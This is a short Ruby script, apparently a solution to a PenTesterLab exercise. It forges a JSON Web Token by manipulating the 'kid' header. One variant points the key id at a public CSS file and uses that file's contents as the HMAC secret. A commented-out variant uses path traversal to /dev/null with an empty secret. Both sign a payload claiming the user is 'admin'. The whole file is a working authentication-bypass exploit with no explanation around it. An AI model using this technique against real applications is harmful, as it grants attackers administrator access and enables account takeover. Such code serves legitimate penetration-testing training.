require 'base64'
require 'openssl'


header = '{"typ":"JWT","alg":"HS256","kid":"public/css/bootstrap.css"}'
# header = '{"typ":"JWT","alg":"HS256","kid":"../../../../../../../../dev/null"}'
# payload = '{"user":null}'
payload = '{"user":"admin"}'
# sig = 'spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y'

data = Base64.strict_encode64(header)+"."+Base64.strict_encode64(payload)
data.gsub!("=","")

# for public/css header
secret = File.open("../../../Documents/PenTesterLab/bootstrap.css").read

# for Dev/nul header
# secret = ""


signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, data))

puts data+"."+signature